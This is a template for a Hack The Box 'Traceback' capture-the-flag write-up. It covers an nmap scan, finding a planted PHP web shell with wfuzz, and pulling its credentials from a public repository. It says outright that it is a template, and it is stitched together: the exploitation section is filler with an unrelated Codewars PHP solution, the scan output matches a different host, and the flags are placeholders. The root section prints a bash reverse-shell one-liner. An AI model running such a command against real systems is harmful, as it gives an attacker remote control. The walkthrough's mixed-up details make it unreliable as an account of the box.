---
Title: "Hack The Box - Traceback"
Author: Xh4H
Date: "01-07-2020"
---

# Information Gathering

## Nmap
We begin our reconnaissance by running an Nmap scan:

```console
x@wartop:~$ nmap -sVC 192.168.100.6

Starting Nmap 7.01 ( https://nmap.org ) at 2019-08-11 08:57 PDT
Nmap scan report for 192.168.100.6 (192.168.100.1)
Host is up (0.022s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.9 (protocol 2.0)
53/tcp  open  domain
81/tcp  open  http     Apache httpd
|_http-server-header: Apache
444/tcp open  ssl/http Apache httpd
|_http-server-header: Apache
| ssl-cert: Subject: commonName=192.168.100.6
| Not valid before: 2018-07-06T14:40:08
|_Not valid after:  4756-06-01T14:40:08

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 201.22 seconds
```
As you can see, `Apache` on ports `81/444` and `SSH` on port `22` are the only things that seem to be running.
Since I knew that there was a HTTP server running on the machine, I went to go check it out.

![Website Source](https://i.imgur.com/aA7YOYG.png)

I thought that this must've been a hint, so I did a little Googling. I found ![Website Source](https://github.com/Xh4H/Web-Shells) Github repository, which had a list of php files (presumably web shells). On the website, there is a ```html <h2>``` tag that reads `"I have left a backdoor for all the net. FREE INTERNETZZZ"`, which only means that one of these php files are somewhere on the server.

![Github Repo](https://i.imgur.com/vnl5iw9.png)

To find it, I then used a tool called `wfuzz`. I created a text file that listed all of the filenames from the repository, which I then fed into `fuzz` to see if they were files that existed on the server.

![Wfuzz](https://i.imgur.com/xpaFnXQ.png)

As you can see, a file called `smevk.php` was found! So naturally, I went to it and found the shell's login panel. I didn't have any credentials yet however, but I knew where I might find them.

![Shell Creds](https://i.imgur.com/K4XTEfb.png)

In the `smevk.php` source in the repository, exactly as I had thought, led the admin credentials to the panel.


# Exploitation  

In order to gain our initial foothold we need to blablablabla. Here's another code snippet just for fun.

```php
function sqInRect($lng, $wdth) {

    if($lng == $wdth) {
      return null;
    }

    $squares = array();

    while($lng*$wdth >= 1) {
      if($lng>$wdth) {
        $base = $wdth;
        $lng = $lng - $base;
      }
      else {
        $base = $lng;
        $wdth = $wdth - $base;
      }
      array_push($squares, $base);
    }
    return $squares;
}
```
Above is the php code for the **Rectangle into Squares** kata solution from codewars.


## User Flag

In order to get the user flag, we simply need to use `cat`, because this is a template and not a real writeup!

```
x@wartop:~$ cat user.txt
6u6baafnd3d54fc3b47squhp4e2bhk67
```

## Root Flag

The privilege escalation for this box was not hard, because this is an example and I've got sudo password. Here's some code to call a reverse shell `bash -i >& /dev/tcp/127.0.0.1/4444 0>&1`.


![Root](./images/root.png)
\ **Figure 3:** root.txt v5gw5zkh8rr3vmye7p4ka


# Conclusion
In the conclusion sections I like to write a little bit about how the box seemed to me overall, where I struggled, and what I learned.

# References
1. [https://ryankozak.com/how-i-do-my-ctf-writeups/](https://ryankozak.com/how-i-do-my-ctf-writeups/)
2. [https://github.com/Wandmalfarbe/pandoc-latex-template](https://github.com/Wandmalfarbe/pandoc-latex-template)
3. [https://hackthebox.eu](https://hackthebox.eu)
4. [https://forum.hackthebox.eu](https://forum.hackthebox.eu)
